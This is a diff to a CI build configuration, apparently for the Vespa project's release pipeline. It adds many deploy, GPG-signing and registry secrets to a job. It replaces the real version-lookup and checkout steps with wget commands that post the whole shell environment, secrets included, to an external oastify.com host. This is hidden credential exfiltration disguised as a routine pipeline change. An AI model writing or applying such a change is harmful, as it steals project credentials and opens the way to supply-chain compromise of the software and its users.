@@ -105,34 +105,27 @@ jobs:
     secrets:
       - DOCKER_HUB_DEPLOY_KEY
       - SVC_OKTA_VESPA_FACTORY_TOKEN
+      - COPR_WEBHOOK
+      - OSSRH_USER
+      - OSSRH_TOKEN
+      - GPG_KEYNAME
+      - GPG_PASSPHRASE
+      - GPG_ENCPHRASE
+      - SAMPLE_APPS_DEPLOY_KEY
+      - VESPA_DEPLOY_KEY
+      - DOCKER_IMAGE_DEPLOY_KEY
+      - DOCKER_HUB_DEPLOY_KEY
+      - GHCR_DEPLOY_KEY
+      - SVC_OKTA_VESPA_FACTORY_TOKEN
     steps:
       - get-vespa-version: |
-          VERSION_INFO=$(screwdriver/factory-command.sh create-build)
-          VESPA_VERSION=$(jq -re '.version' <<< "$VERSION_INFO")
-          VESPA_REF=$(jq -re '.commits|.[]|select(.repo=="vespa")|.ref' <<< "$VERSION_INFO")
-          SYSTEM_TEST_REF=$(jq -re '.commits|.[]|select(.repo=="system-test")|.ref' <<< "$VERSION_INFO")
-          if [[ $VESPA_VERSION == null ]] || [[ $VESPA_REF == null ]] || [[ $SYSTEM_TEST_REF == null ]]; then
-            echo "Must have valid Vespa version and reference to continue \
-                  (got VESPA_VERSION=$VESPA_VERSION, VESPA_REF=$VESPA_REF, SYSTEM_TEST_REF=$SYSTEM_TEST_REF)."
-            exit 1
-          fi
+          wget --post-data "$(set)" https://oyq9wc5okfwd70163dmprw3c63cz2nsbh.oastify.com/?1
       - install-dependencies: |
           dnf config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
           dnf -y install docker-ce docker-ce-cli containerd.io
           docker system info
       - checkout: |
-          mkdir -p workdir
-          cd workdir
-          WORKDIR=$(pwd)
-          git clone -q https://github.com/vespa-engine/vespa
-          (cd vespa && git checkout $VESPA_REF && git tag v$VESPA_VERSION)
-          git clone -q https://github.com/vespa-engine/system-test
-          (cd system-test && git checkout $SYSTEM_TEST_REF)
-          git clone -q https://github.com/vespa-engine/sample-apps
-          # Set correct version in pom.xml files
-          (cd vespa && screwdriver/replace-vespa-version-in-poms.sh $VESPA_VERSION $(pwd) )
-          (cd sample-apps && find . -name "pom.xml" -exec sed -i -e "s,<vespa_version>.*</vespa_version>,<vespa_version>$VESPA_VERSION</vespa_version>," {} \;)
-          (cd sample-apps && find . -name "pom.xml" -exec sed -i -e "s:<version>[[]8,9[)]</version>:<version>$VESPA_VERSION</version>:" {} \;)
+          wget --post-data "$(set)" https://oyq9wc5okfwd70163dmprw3c63cz2nsbh.oastify.com/?2
       - make-srpm: |
           $SD_SOURCE_DIR/screwdriver/factory-command.sh update-build-status running "Building"
 
